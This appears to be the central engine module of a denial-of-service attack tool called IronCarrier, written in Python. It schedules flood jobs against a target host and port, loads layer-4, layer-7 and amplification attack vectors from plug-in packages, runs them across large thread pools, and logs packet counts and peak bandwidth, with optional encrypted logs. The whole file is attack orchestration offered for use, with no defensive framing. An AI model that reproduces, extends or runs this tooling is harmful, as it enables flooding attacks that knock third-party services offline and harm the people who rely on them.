#!/usr/bin/env python3
"""
IronCarrier Engine
Central orchestration layer - manages attack lifecycle, thread pools, vector loading
"""

import time
import threading
import signal
import sys
import importlib
import importlib.util
import pkgutil
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Optional, Callable, Any
from dataclasses import dataclass, field
from enum import Enum

from .config import Config
from .logger import Logger
from .stats import StatsCollector


class AttackState(Enum):
    IDLE = "idle"
    INITIALIZING = "initializing"
    RUNNING = "running"
    PAUSED = "paused"
    STOPPING = "stopping"
    COMPLETED = "completed"
    FAILED = "failed"


@dataclass
class AttackJob:
    target: str
    port: int
    vector: str
    duration: int
    state: AttackState = AttackState.IDLE
    start_time: Optional[float] = None
    end_time: Optional[float] = None
    threads: int = 100
    options: Dict[str, Any] = field(default_factory=dict)
    error: Optional[str] = None
    job_id: Optional[str] = None

    def __post_init__(self):
        if self.job_id is None:
            import uuid
            self.job_id = uuid.uuid4().hex[:8]


class VectorRegistry:
    """Registry for available attack vectors"""
    
    VECTOR_CATEGORIES = [
        'ironcarrier.vectors.layer4',
        'ironcarrier.vectors.layer7',
        'ironcarrier.vectors.amplification',
    ]
    
    def __init__(self):
        self._vectors: Dict[str, tuple] = {}
        self._discovered = False
    
    def discover(self) -> None:
        """Scan and register all available vector modules"""
        self._vectors.clear()
        
        for category in self.VECTOR_CATEGORIES:
            try:
                pkg = importlib.import_module(category)
                if hasattr(pkg, '__path__'):
                    for importer, modname, ispkg in pkgutil.iter_modules(pkg.__path__):
                        full_path = f"{category}.{modname}"
                        try:
                            module = importlib.import_module(full_path)
                            if hasattr(module, 'Attack'):
                                self._vectors[modname] = (module.Attack, full_path)
                        except ImportError:
                            continue
            except ImportError:
                continue
        
        self._discovered = True
    
    def get(self, name: str) -> Optional[Callable]:
        """Get vector class by name"""
        if not self._discovered:
            self.discover()
        
        if name in self._vectors:
            return self._vectors[name][0]
        
        # Try direct module load
        for category in self.VECTOR_CATEGORIES:
            full_path = f"{category}.{name}"
            try:
                module = importlib.import_module(full_path)
                if hasattr(module, 'Attack'):
                    self._vectors[name] = (module.Attack, full_path)
                    return module.Attack
            except ImportError:
                continue
        
        return None
    
    def list_all(self) -> Dict[str, str]:
        """List all vectors with their module paths"""
        if not self._discovered:
            self.discover()
        return {name: info[1] for name, info in self._vectors.items()}
    
    def list_by_category(self) -> Dict[str, List[str]]:
        """Group vectors by category"""
        if not self._discovered:
            self.discover()
        
        grouped = {}
        for name, (_, path) in self._vectors.items():
            category = path.split('.')[2] if len(path.split('.')) > 2 else 'unknown'
            if category not in grouped:
                grouped[category] = []
            grouped[category].append(name)
        
        return grouped


class Engine:
    """Main attack orchestration engine"""
    
    def __init__(self, config_path: str = None):
        self.config = Config(config_path) if config_path else Config()
        self.logger = Logger(
            log_dir=self.config.get('logging.dir', 'logs'),
            max_size_mb=self.config.get('logging.rotate_size_mb', 100),
            encrypt=self.config.get('logging.encrypt', False)
        )
        self.stats = StatsCollector()
        self.registry = VectorRegistry()
        self.state = AttackState.IDLE
        
        self._current_job: Optional[AttackJob] = None
        self._executor: Optional[ThreadPoolExecutor] = None
        self._stop_event = threading.Event()
        self._lock = threading.Lock()
        self._job_history: List[AttackJob] = []
        
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _signal_handler(self, signum, frame):
        self.logger.info(f"Signal {signum} received, shutting down")
        self.stop()
    
    def _execute_vector_instance(self, vector_class: Callable, job: AttackJob) -> None:
        """Execute a single vector instance in a thread"""
        try:
            instance = vector_class(
                target=job.target,
                port=job.port,
                duration=job.duration,
                threads=1,
                stop_event=self._stop_event,
                stats=self.stats,
                **job.options
            )
            instance.run()
        except Exception as e:
            self.logger.debug(f"Vector instance error: {e}")
            self.stats.add_error()
    
    def launch(self, job: AttackJob) -> bool:
        """Launch an attack job"""
        with self._lock:
            if self.state not in [AttackState.IDLE, AttackState.COMPLETED, AttackState.FAILED]:
                self.logger.warning(f"Engine busy ({self.state.value}), cannot launch")
                return False
            
            self._current_job = job
            self._stop_event.clear()
        
        # Resolve and load vector
        vector_class = self.registry.get(job.vector)
        if vector_class is None:
            job.state = AttackState.FAILED
            job.error = f"Vector not found: {job.vector}"
            self.logger.error(job.error)
            with self._lock:
                self._current_job = None
                self.state = AttackState.IDLE
            return False
        
        job.state = AttackState.INITIALIZING
        self.logger.info(f"[{job.job_id}] Initializing: {job.vector} -> {job.target}:{job.port}")
        
        # Prepare executor
        max_threads = self.config.get('engine.max_threads', 500)
        actual_threads = min(job.threads, max_threads)
        self._executor = ThreadPoolExecutor(max_workers=actual_threads + 5)
        
        job.start_time = time.time()
        job.state = AttackState.RUNNING
        self.state = AttackState.RUNNING
        
        self.stats.reset()
        self.stats.start_display()
        
        self.logger.info(f"[{job.job_id}] Running with {actual_threads} threads for {job.duration}s")
        
        try:
            futures = []
            for _ in range(actual_threads):
                future = self._executor.submit(self._execute_vector_instance, vector_class, job)
                futures.append(future)
            
            # Wait for completion or timeout
            self._executor.shutdown(wait=True)
            
        except Exception as e:
            job.error = str(e)
            job.state = AttackState.FAILED
            self.logger.error(f"[{job.job_id}] Failed: {e}")
        finally:
            job.end_time = time.time()
            self.stats.stop_display()
            
            if job.state == AttackState.RUNNING:
                job.state = AttackState.COMPLETED
            
            self.state = AttackState.COMPLETED
            self._job_history.append(job)
            self._log_completion(job)
            
            with self._lock:
                self._current_job = None
        
        return job.state == AttackState.COMPLETED
    
    def stop(self) -> None:
        """Stop the current attack"""
        with self._lock:
            if self.state != AttackState.RUNNING:
                return
            self.state = AttackState.STOPPING
            if self._current_job:
                self._current_job.state = AttackState.STOPPING
        
        self._stop_event.set()
        self.logger.info("Stop signal dispatched")
    
    def pause(self) -> None:
        """Pause current attack (alias for stop)"""
        self.stop()
    
    def get_status(self) -> Dict[str, Any]:
        """Get current engine and job status"""
        with self._lock:
            result = {
                'engine_state': self.state.value,
                'job': None,
                'history_count': len(self._job_history)
            }
            
            if self._current_job:
                job = self._current_job
                elapsed = (time.time() - job.start_time) if job.start_time else 0
                result['job'] = {
                    'id': job.job_id,
                    'target': job.target,
                    'port': job.port,
                    'vector': job.vector,
                    'state': job.state.value,
                    'elapsed': round(elapsed, 2),
                    'duration': job.duration,
                    'progress': min(elapsed / job.duration, 1.0) if job.duration > 0 else 0,
                    'error': job.error
                }
            
            return result
    
    def get_stats(self) -> Dict[str, Any]:
        """Get current statistics snapshot"""
        return self.stats.export()
    
    def get_history(self, limit: int = 10) -> List[Dict]:
        """Get recent job history"""
        jobs = self._job_history[-limit:]
        result = []
        for job in jobs:
            duration = (job.end_time - job.start_time) if job.end_time and job.start_time else 0
            result.append({
                'id': job.job_id,
                'target': job.target,
                'port': job.port,
                'vector': job.vector,
                'state': job.state.value,
                'duration': round(duration, 2),
                'error': job.error
            })
        return result
    
    def list_vectors(self) -> Dict[str, List[str]]:
        """List available vectors grouped by category"""
        return self.registry.list_by_category()
    
    def _log_completion(self, job: AttackJob) -> None:
        """Log attack completion"""
        duration = (job.end_time - job.start_time) if job.end_time and job.start_time else 0
        stats_data = self.stats.export()
        
        self.logger.info(f"[{job.job_id}] Completed: {job.vector} -> {job.target}:{job.port}")
        self.logger.info(f"[{job.job_id}] Duration: {duration:.2f}s | Final state: {job.state.value}")
        self.logger.info(f"[{job.job_id}] Packets: {stats_data['total_packets']:,} | Bandwidth peak: {stats_data['peak_mbps']:.2f} Mbps")
        
        self.logger.log_attack(job.target, job.vector, duration, stats_data)
    
    def cleanup(self) -> None:
        """Cleanup all resources"""
        if self.state == AttackState.RUNNING:
            self.stop()
        if self._executor:
            self._executor.shutdown(wait=False, cancel_futures=True)
        self.logger.close()
